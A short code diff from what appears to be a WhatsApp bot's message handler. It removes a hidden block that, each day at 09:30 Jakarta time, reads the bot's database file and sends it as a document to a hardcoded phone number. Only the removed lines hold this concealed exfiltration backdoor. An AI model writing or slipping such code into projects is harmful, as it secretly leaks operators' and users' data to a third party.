@@ -43,13 +43,6 @@ module.exports = {
             }
             const groupSet = global.db.data.group.find(v => v.jid)
             
-            const jadwal = moment().tz('Asia/Jakarta').format('HH:mm:ss')
-            if (jadwal === "09:30:00") {
-                let sesi = await fs.readFileSync('./ktdprjct.db.json')
-                return await this.sendMessage('62895323071410@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: m })
-                m.reply('test')
-            }
-            
             if (m.isGroup && !m.fromMe) {
                 let now = new Date() * 1
                 if (!groupSet.member[m.sender]) {
